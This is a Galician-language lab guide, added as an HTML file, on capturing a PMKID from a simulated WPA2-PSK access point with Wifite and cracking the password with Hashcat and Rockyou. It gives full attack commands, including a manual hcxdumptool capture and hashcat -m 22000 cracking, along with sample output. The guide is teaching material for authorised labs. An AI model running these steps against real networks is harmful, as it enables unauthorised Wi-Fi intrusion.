@@ -1,0 +1,326 @@
+<!doctype html><html lang="gl"><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Guía da práctica Wifite 1.4 — PMKID en WPA2-PSK</title><style>
+:root{color-scheme:light dark}body{font:16px/1.58 system-ui,Arial;margin:0;background:#f7f9fb;color:#1c2e3d}.wrap{max-width:940px;margin:0 auto;padding:22px 28px 70px}a{color:#1460a0}header{position:sticky;top:0;background:#12334d;color:#fff;padding:12px 26px}header a{color:#fff}article{background:white;border-radius:16px;padding:25px 36px;box-shadow:0 4px 20px #18364f11}h1{font-size:1.7rem;line-height:1.25}h2{font-size:1.35rem;margin-top:2rem;border-bottom:1px solid #d7e0e7;padding-bottom:.4rem}h3{font-size:1.1rem}pre{padding:14px 18px;background:#11283a;color:#e4f5ff;overflow:auto;border-radius:9px;white-space:pre}pre code{font:13px/1.5 ui-monospace,Consolas,monospace}p code,li code{background:#e8eff5;padding:2px 4px;border-radius:4px}table{border-collapse:collapse;display:block;overflow:auto}td,th{border:1px solid #d4e0ea;padding:8px;text-align:left}img{max-width:100%;height:auto}blockquote{border-left:4px solid #14a3b8;padding:2px 12px;background:#eff7f9}.notice{padding:10px 15px;border-left:4px solid #16a5bd;background:#eff9fc;border-radius:6px}.notice.warning{border-color:#db7e26;background:#fff7eb}.notice strong{display:block} @media(max-width:640px){.wrap{padding:12px}article{padding:15px}} </style><header><a href="../index.html">← Volver ao laboratorio interactivo</a> · Guía docente validada</header><main class="wrap"><article><h1>Guía da práctica Wifite 1.4 — PMKID en WPA2-PSK</h1>
+<div class="notice warning"><strong>**LIMITACIÓN DE RESPONSABILIDADE**</strong>
+<p>O autor do presente documento declina calquera responsabilidade asociada ao uso incorrecto e/ou malicioso que puidese realizarse coa información exposta no mesmo. Este documento foi xerado para uso didáctico e debe ser empregado en contornas privadas e virtuais controladas co permiso correspondente do administrador desas contornas.<br />
+O uso de Wifite ou calquera outra ferramenta de auditoría en redes Wi-Fi sen autorización expresa é <strong>ILEGAL</strong>.</p>
+</div>
+<h2>1. Resumo</h2>
+<p>Esta práctica introduce o ataque <strong>PMKID (Pairwise Master Key Identifier)</strong> como método alternativo para auditar redes WPA2-PSK utilizando <strong>Wifite</strong> como ferramenta automatizada.</p>
+<div class="notice info"><strong>Resultado comprobado no laboratorio</strong>
+<p>Co escenario <code>psk</code>, Wifite conseguiu capturar un PMKID e recuperar o contrasinal con Hashcat. A captura require que o intercambio proporcione un PMKID aproveitable; noutras redes o resultado pode variar. A evidencia distintiva é un rexistro <code>WPA*01</code> no formato Hashcat 22000, non <code>WPA*02</code> (EAPOL).</p>
+</div>
+<hr />
+<h2>2. Funcionamento de Wifite con PMKID</h2>
+<p>Wifite automatiza o recoñecemento do AP, o intento de captura PMKID e a comprobación de contrasinais mediante ferramentas auxiliares. No laboratorio comprobouse que <strong>Wifite captura PMKID no escenario <code>psk</code> e Hashcat recupera a clave de proba</strong>.</p>
+<p>Isto non significa que todos os puntos de acceso proporcionen PMKID. O resultado depende da configuración e do intercambio observado. Cando non aparece un <code>WPA*01</code>, cómpre documentar a ausencia, comprobar os avisos de Wifite e distinguir PMKID dun handshake EAPOL <code>WPA*02</code>.</p>
+<p>| Comprobación | Resultado no laboratorio |
+|---|---|
+| Detección do AP <code>EMPRESA-XYZ</code> | Correcta |
+| Captura PMKID con Wifite | Correcta |
+| Recuperación da PSK con Hashcat e Rockyou | Correcta, tras habilitar OpenCL con PoCL |
+| Captura PMKID noutros AP | Non garantida |</p>
+<div class="notice warning"><strong>Procesos necesarios para o escenario</strong>
+<p>Se Wifite informa de procesos en conflito (<code>hostapd</code>, <code>wpa_supplicant</code>), non empregues <code>--kill</code>: manteñen activos o AP e o cliente do laboratorio.</p>
+</div>
+<h3>OpenCL para Hashcat na VM</h3>
+<p>A instalación de Hashcat, por si soa, non garante que exista un dispositivo de cálculo. Para executar Hashcat sobre a CPU virtualizada, se aínda non está configurado:</p>
+<pre><code class="language-bash">sudo apt update
+sudo apt install -y pocl-opencl-icd clinfo
+clinfo -l
+hashcat -I
+</code></pre>
+<p>Se aparece <code>CL_PLATFORM_NOT_FOUND_KHR</code>, Hashcat non detecta unha plataforma OpenCL. Iso é distinto dun contrasinal incorrecto.</p>
+<h3>Execución limpa e evidencias independentes</h3>
+<p>Para non reutilizar capturas ou resultados doutras prácticas, crea un directorio de traballo exclusivo <strong>antes de iniciar Wifite</strong>:</p>
+<pre><code class="language-bash">sudo install -d -m 700 /root/wifite-pmkid
+sudo -i
+cd /root/wifite-pmkid
+pwd
+ls -la
+</code></pre>
+<p>Se xa executaches Wifite nese directorio, <strong>conserva as evidencias antes de limpar</strong>. Para repetir desde cero, sempre desde <code>/root</code> e despois de confirmar a ruta:</p>
+<pre><code class="language-bash">cd /root
+mv wifite-pmkid &quot;wifite-pmkid-arquivo-$(date +%Y%m%d-%H%M%S)&quot;
+install -d -m 700 /root/wifite-pmkid
+cd /root/wifite-pmkid
+</code></pre>
+<p>Wifite pode xerar <code>hs/</code>, <code>cracked.json</code>, <code>cracked.txt</code> ou rexistros no directorio de traballo. O <em>potfile</em> global de Hashcat é independente: non o borres porque pode conter traballos alleos. Para unha comprobación manual reproducible, usa <code>hashcat --potfile-disable</code>.</p>
+<p>Para identificar unha captura PMKID auténtica, converte a captura nova con <code>hcxpcapngtool</code> e comproba que contén <strong><code>WPA*01</code></strong>. Unha liña <code>WPA*02</code> identifica unha parella EAPOL, non un PMKID.</p>
+<hr />
+<h2>3. Obxectivos de aprendizaxe</h2>
+<ul>
+<li>Identificar o AP WPA2-PSK e comprobar o seu BSSID e a canle.</li>
+<li>Automatizar con Wifite a captura dun PMKID no escenario de laboratorio <code>psk</code>.</li>
+<li>Distinguir as evidencias <code>WPA*01</code> (PMKID) e <code>WPA*02</code> (EAPOL).</li>
+<li>Validar con Hashcat e Rockyou a robustez da clave compartida de proba.</li>
+<li>Evitar a reutilización de capturas e resultados de execucións anteriores.</li>
+<li>Comprender que non todos os AP proporcionan un PMKID capturable.</li>
+</ul>
+<p><strong>Vantaxes potenciais do PMKID respecto dunha captura por desautenticación:</strong> non require capturar as catro mensaxes do 4-way handshake nin desautenticar un cliente lexítimo; non obstante, a súa dispoñibilidade non está garantida e a técnica deixa tráfico observable.</p>
+<hr />
+<h2>4. Material necesario</h2>
+<p><strong>Hardware/Software:</strong></p>
+<ul>
+<li>Host alumnado · Máquina virtual GNU/Linux Kali amd64</li>
+<li>RAM ≥ 2048 MB · CPU ≥ 2 cores · PAE/NX habilitado</li>
+</ul>
+<p><strong>Ferramentas</strong> (xa instaladas en Kali):<br />
+<code>wifite</code>, <code>hcxdumptool</code> (≥ 7.0.0), <code>hcxpcapngtool</code> (parte de hcxtools), <code>hashcat</code>, <code>hostapd</code>, <code>wpa_supplicant</code>, <code>mac80211_hwsim</code></p>
+<p><strong>Wordlist:</strong> <code>/usr/share/wordlists/rockyou.txt.gz</code></p>
+<p><strong>Referencias:</strong></p>
+<ul>
+<li>[0] <a href="https://raw.githubusercontent.com/ricardofc/repoEDU-CCbySA/main/HE/Taller/Wi-Fi/1-Taller-HE-Practica-WiFi-4.pdf">1-Taller-HE-Practica-WiFi-4.pdf</a>{:target=&quot;_blank&quot;}</li>
+<li>[1] <a href="https://github.com/derv82/wifite2">Wifite2 GitHub</a>{:target=&quot;_blank&quot;}</li>
+<li>[2] Descubridor PMKID: Jens &quot;atom&quot; Steube (Agosto 2018)</li>
+<li>[3] <a href="https://hashcat.net/forum/thread-7717.html">Hashcat Forum — PMKID Attack</a>{:target=&quot;_blank&quot;}</li>
+</ul>
+<hr />
+<h2>5. Escenario e topoloxía</h2>
+<p>| Rol               | Interface | Namespace             | IP               | Estado tras <code>wifilabctl up</code> |
+|-------------------|-----------|-----------------------|------------------|-----------------------------|
+| AP WPA2-PSK       | <code>wlan0</code>   | <code>wifi_ap_wlan0</code>       | <code>192.168.10.1</code>   | ✅ Automático                |
+| Cliente WPA2      | <code>wlan1</code>   | <code>wifi_cliente_wlan1</code>  | <code>192.168.10.2</code>   | ✅ Automático                |
+| Atacante (Wifite) | <code>wlan2</code>   | (global)              | —                | Interface dispoñible           |
+| Monitor adicional | <code>wlan3</code>   | (global)              | —                | Interface dispoñible           |</p>
+<p><strong>SSID:</strong> <code>EMPRESA-XYZ</code> · <strong>Contrasinal:</strong> <code>spongebob19</code> · <strong>Canal:</strong> 6</p>
+<pre><code>[wlan1: Cliente PSK]  ----wireless----&gt; [wlan0: AP WPA2-PSK]
+                                              ^
+                                              |
+                                    [wlan2mon: Wifite / hcxdumptool]
+                                    (captura PMKID con Wifite)
+</code></pre>
+<blockquote>
+<p>💡 <code>wifilabctl up psk</code> levanta automaticamente AP e cliente. As terminais utilízanse para captura, comprobación e análise, non para configuración manual.</p>
+</blockquote>
+<hr />
+<h2>6. Procedemento</h2>
+<p><strong>Resumo de terminais:</strong></p>
+<p>Emprega as seguintes terminais desde a sesión gráfica de Kali; o traballo con Wifite realizarase nun directorio propio para non mesturar resultados.</p>
+<p>| Terminal | Rol                                                        |
+|----------|------------------------------------------------------------|
+| 1        | Arrancar o escenario e verificacións                       |
+| 2        | Captura PMKID con Wifite                  |
+| 3        | Verificación manual con <code>hcxdumptool</code> (opcional) |</p>
+<hr />
+<h3>Terminal 1 — Arrancar o escenario</h3>
+<pre><code class="language-bash"># Mesmo escenario que a Práctica 1-1
+sudo wifilabctl up psk
+</code></pre>
+<p>Saída esperada:</p>
+<pre><code>[*] Informe de Estado do Laboratorio
+============================================================
+NAMESPACE                 INTERFACE       IP                   ESTADO
+---------------------------------------------------------------------------
+wifi_cliente_wlan1        wlan1           192.168.10.2/24      UP
+wifi_ap_wlan0             wlan0           192.168.10.1/24      UP
+---------------------------------------------------------------------------
+Interfaces GLOBAIS / ATACANTE:
+(global)                  wlan2           (host/monitor)       LISTO
+(global)                  wlan3           (host/monitor)       LISTO
+</code></pre>
+<blockquote>
+<p>⚠️ O escenario <code>psk</code> é o mesmo da <a href="1.1-ATAQUE_WPA2_PSK.html">Práctica 1.1</a>{:target=&quot;_blank&quot;}. Os valores de BSSID e MAC do cliente obtéñense con <code>sudo wifilabctl status</code>.</p>
+</blockquote>
+<hr />
+<h3>Terminal 2 — Captura PMKID con Wifite</h3>
+<p>Abrir unha <strong>segunda terminal</strong> e seguir os pasos:</p>
+<h4>Paso 1: Acceder como root e verificar ferramentas</h4>
+<pre><code class="language-bash">sudo -i
+cd /root/wifite-pmkid
+
+# Verificar que hcxdumptool está instalado (requirido por Wifite para PMKID)
+which hcxdumptool &amp;&amp; hcxdumptool --version
+which hcxpcapngtool
+
+# Se non están instalados:
+apt update &amp;&amp; apt -y install hcxdumptool hcxtools
+
+# Descomprimir wordlist
+gunzip -kf /usr/share/wordlists/rockyou.txt.gz
+</code></pre>
+<h4>Paso 2: Lanzar Wifite con ataque PMKID</h4>
+<pre><code class="language-bash">wifite -i wlan2 --pmkid --dict /usr/share/wordlists/rockyou.txt
+</code></pre>
+<blockquote>
+<p><code>-i wlan2</code>: interface a usar · <code>--pmkid</code>: priorizar PMKID sobre handshake · <code>--dict</code>: wordlist para cracking</p>
+</blockquote>
+<h4>Paso 3: Avisos de procesos en conflito — non matar</h4>
+<pre><code> [!] Conflicting processes: NetworkManager (PID 642), wpa_supplicant (PID 1919),
+     hostapd (PID 2009), wpa_supplicant (PID 2024)
+ [!] If you have problems: kill -9 PID or re-run wifite with --kill
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Non matar eses procesos.</strong> Son o AP e o cliente do escenario. Ignorar e continuar.</p>
+</blockquote>
+<h4>Paso 4: Seleccionar a interface de ataque</h4>
+<p>Con <code>mac80211_hwsim</code>, Wifite pide seleccionar entre <code>wlan2</code> e <code>wlan3</code>:</p>
+<pre><code>    Interface   PHY   Driver              Chipset
+-----------------------------------------------------------------------
+ 1. wlan2       phy2  ??????              non-mac80211 device? (report this!)
+ 2. wlan3       phy3  ??????              non-mac80211 device? (report this!)
+ [+] Select wireless interface (1-2): 1
+</code></pre>
+<p>Introducir <code>1</code> e premer Enter.</p>
+<blockquote>
+<p>💡 O aviso <code>non-mac80211 device?</code> é normal con interfaces virtuais. Non impide o funcionamento.</p>
+</blockquote>
+<h4>Paso 5: Escaneo e selección do AP obxectivo</h4>
+<p>Wifite escaneará en modo monitor. Cando apareza <code>EMPRESA-XYZ</code> premer <code>Ctrl+C</code>:</p>
+<pre><code>   NUM                      ESSID   CH  ENCR    PWR    WPS  CLIENT
+   ---  -------------------------  ---  -----   ----   ---  ------
+     1               EMPRESA-XYZ     6  WPA-P   72db    no     1
+</code></pre>
+<pre><code> [+] Select target(s) (1-1) separated by commas, dashes or all: 1
+</code></pre>
+<p>Introducir <code>1</code> e premer Enter.</p>
+<h4>Paso 6: Captura PMKID e recuperación da clave</h4>
+<p>Wifite iniciará o intento de captura PMKID e, se atopa material válido, poderá invocar Hashcat coa lista Rockyou. No laboratorio comprobouse a captura do PMKID e a recuperación de <code>spongebob19</code>.</p>
+<p><strong>Exemplo de saída real dunha execución correcta no laboratorio:</strong></p>
+<pre><code class="language-text"> NUM                    ESSID   CH  ENCR    PWR  WPS  CLIENT
+ ---  -----------------------  ---  -----  ----  ---  ------
+   1              EMPRESA-XYZ    6  WPA2-P  72db   no       1
+
+[+] Select target(s) (1-1) separated by commas, dashes or all: 1
+[+] (1/1) Starting attacks against 46:02:77:21:58:3C (EMPRESA-XYZ)
+[+] EMPRESA-XYZ (72db) PMKID CAPTURE: Captured PMKID
+[+] EMPRESA-XYZ (72db) PMKID CRACK: Cracking PMKID using /usr/share/wordlists/rockyou.txt ...
+[+] EMPRESA-XYZ (72db) PMKID CRACKED: Key: spongebob19
+
+[+]  Access Point Name: EMPRESA-XYZ
+[+]  Access Point BSSID: 46:02:77:21:58:3C
+[+]  Encryption: PMKID
+[+]  PMKID File: hs/pmkid_EMPRESAXYZ_46-02-77-21-58-3C_2026-11-16T11-16-48.22000
+[+]  PSK (password): spongebob19
+[+] saved result to cracked.json (1 total)
+[+] Finished attacking 1 target(s), exiting
+</code></pre>
+<p>Nesta saída obsérvanse <strong>tres fitos diferentes</strong>:</p>
+<ol>
+<li><strong><code>PMKID CAPTURE: Captured PMKID</code></strong>: Wifite obtivo material PMKID do AP seleccionado.</li>
+<li><strong><code>PMKID CRACK: Cracking PMKID ...</code></strong>: iniciouse a comprobación dos contrasinais do dicionario Rockyou.</li>
+<li><strong><code>PMKID CRACKED: Key: spongebob19</code></strong>: o candidato correspondente á clave de proba foi verificado satisfactoriamente.</li>
+</ol>
+<p>O ficheiro <code>hs/pmkid_...22000</code> conserva o material da captura e <code>cracked.json</code> rexistra o resultado. O <strong>BSSID e o nome do ficheiro cambian en cada execución</strong>: os valores anteriores son os da captura utilizada como exemplo. A mensaxe <code>PMKID CRACKED</code> acredita a recuperación do contrasinal neste intento, e é distinta dunha captura que só obtivese PMKID sen recuperar a clave.</p>
+<p>Non confundas os resultados:</p>
+<ul>
+<li><strong>PMKID capturado:</strong> Wifite indica éxito na captura; verifica no artefacto convertido a <code>22000</code> que exista <code>WPA*01</code>.</li>
+<li><strong>Clave recuperada:</strong> Hashcat consegue verificar un candidato da lista de dicionario.</li>
+<li><strong><code>key unknown</code>:</strong> non demostra por si só que o contrasinal non estea na lista; comproba <code>hashcat -I</code> e a dispoñibilidade de OpenCL.</li>
+<li><strong>Tempo de espera esgotado:</strong> nese intento non se obtivo un PMKID; anota a evidencia e non afirmes que a ferramenta nunca funciona.</li>
+</ul>
+<p>Comproba os novos ficheiros producidos dentro de <code>/root/wifite-pmkid</code> e conserva a saída da ferramenta como evidencia da práctica.</p>
+<hr />
+<h3>Terminal 1 — Verificacións tras a captura</h3>
+<pre><code class="language-bash"># Confirmar que o cliente permanece conectado (o ataque PMKID non o perturbou)
+sudo ip netns exec wifi_cliente_wlan1 iw dev wlan1 link
+# Connected to &lt;BSSID_AP&gt; (on wlan1)
+# SSID: EMPRESA-XYZ
+
+# Examinar exclusivamente os resultados desta práctica
+sudo find /root/wifite-pmkid -maxdepth 2 -type f -printf &quot;%p\n&quot;
+</code></pre>
+<hr />
+<h3>Terminal 3 — Método manual con hcxdumptool que SÍ funciona (opcional)</h3>
+<p>Se se quere comparar unha captura manual coa automatizada, utiliza <code>hcxdumptool</code> nunha <strong>terceira terminal</strong>, de maneira opcional. Non é necesario para validar o éxito de Wifite:</p>
+<pre><code class="language-bash">sudo su -
+
+# Poñer wlan3 en modo monitor
+ip link set wlan3 down
+iw dev wlan3 set type monitor
+ip link set wlan3 up
+
+# Obter o BSSID do AP (columna INTERFACE wlan0 en wifilabctl status)
+# e convertelo a formato sen dous puntos: ex. 02:00:00:00:00:00 → 020000000000
+sudo wifilabctl status
+
+# Capturar PMKID directamente con hcxdumptool
+hcxdumptool -i wlan3 -w /tmp/pmkid-manual.pcapng \
+  --filtermode=2 --filterlist_ap=&lt;BSSID_SEN_DOUS_PUNTOS&gt; \
+  -c 6 --rds=1
+# Premer Ctrl+C despois de 30 segundos
+
+# Converter a formato hashcat
+hcxpcapngtool -o /tmp/pmkid-manual.hc22000 /tmp/pmkid-manual.pcapng
+
+# Verificar que o PMKID foi capturado (debe mostrar datos)
+cat /tmp/pmkid-manual.hc22000
+
+# Crackear con hashcat
+hashcat -m 22000 /tmp/pmkid-manual.hc22000 /usr/share/wordlists/rockyou.txt
+# KEY FOUND! [ spongebob19 ]
+</code></pre>
+<blockquote>
+<p>💡 O procedemento manual complementario está documentado en <a href="1.4-ATAQUE_WPA2_PSK_PMKID.html">1.3-ATAQUE_WPA2_PSK_PMKID</a>{:target=&quot;_blank&quot;}.</p>
+</blockquote>
+<hr />
+<h2>7. Comparativa PMKID vs handshake tradicional</h2>
+<p>| Característica | Handshake EAPOL | PMKID |
+|---|---|---|
+| Evidencia no formato 22000 | <code>WPA*02</code> | <code>WPA*01</code> |
+| Necesidade de desautenticación | Non sempre: pode capturarse nunha asociación normal | Non é necesaria para obter un PMKID exposto |
+| Material requerido | Parella de mensaxes EAPOL válida | PMKID verificable |
+| Dispoñibilidade | Depende de observar unha autenticación | Depende de que o intercambio proporcione PMKID |
+| Uso de Wifite neste laboratorio | Comprobado | Comprobado |
+| Comprobación de contrasinais | Hashcat (modo 22000) | Hashcat (modo 22000) |</p>
+<p>A captura PMKID pode evitar a desautenticación dun cliente xa conectado, pero <strong>non equivale a unha técnica invisible ou universal</strong>. A robustez do contrasinal segue sendo determinante para resistir as probas de dicionario.</p>
+<hr />
+<h2>8. Preguntas de reflexión</h2>
+<ol>
+<li>
+<p><strong>Que diferenza hai entre <code>WPA*01</code> e <code>WPA*02</code>?</strong></p>
+<ul>
+<li><code>WPA*01</code> representa material PMKID; <code>WPA*02</code> representa material EAPOL. Ambos se empregan no modo 22000, pero non son a mesma técnica.</li>
+</ul>
+</li>
+<li>
+<p><strong>É imprescindible desconectar o cliente para obter un PMKID?</strong></p>
+<ul>
+<li>Non. Un PMKID aproveitable pode aparecer en determinados intercambios sen desautenticación, aínda que non está garantido.</li>
+</ul>
+</li>
+<li>
+<p><strong>Por que <code>key unknown</code> non proba que a clave sexa robusta?</strong></p>
+<ul>
+<li>Pode existir un erro de OpenCL ou do motor de cálculo. Hai que diferenciar os erros de execución dun dicionario esgotado.</li>
+</ul>
+</li>
+<li>
+<p><strong>Que significa que Wifite capture PMKID no laboratorio <code>psk</code>?</strong></p>
+<ul>
+<li>Que esa configuración e ese intercambio xeraron material aproveitable na proba. Non implica que suceda en todas as redes WPA2-PSK.</li>
+</ul>
+</li>
+<li>
+<p><strong>Que vantaxe ten gardar as evidencias nun directorio exclusivo?</strong></p>
+<ul>
+<li>Permite demostrar que o material e o resultado corresponden á execución actual, sen reutilizar capturas anteriores.</li>
+</ul>
+</li>
+<li>
+<p><strong>Como reducir o risco de probas de dicionario?</strong></p>
+<ul>
+<li>Utilizar contrasinais fortes e únicos e, cando sexa viable, WPA3-SAE coas actualizacións e configuracións de seguridade adecuadas.</li>
+</ul>
+</li>
+<li>
+<p><strong>En que contornas é lexítima esta práctica?</strong></p>
+<ul>
+<li>En laboratorios propios ou redes cunha autorización expresa e dentro do alcance acordado.</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h2>9. Limpeza do laboratorio</h2>
+<p><strong>Terminal 1:</strong></p>
+<pre><code class="language-bash"># Deter e eliminar o escenario completamente
+sudo wifilabctl reset
+
+# Verificar que non quedan namespaces
+ip netns list
+</code></pre>
+<p><strong>Terminal 3</strong> (se se usou <code>wlan3</code> en modo monitor):</p>
+<pre><code class="language-bash">ip link set wlan3 down
+iw dev wlan3 set type managed
+ip link set wlan3 up
+</code></pre>
+</article><p>Fonte: Markdown orixinal de <code>20261121_docs.he-ud2.zip</code>. O procedemento debe executarse exclusivamente no laboratorio docente autorizado.</p></main></html>
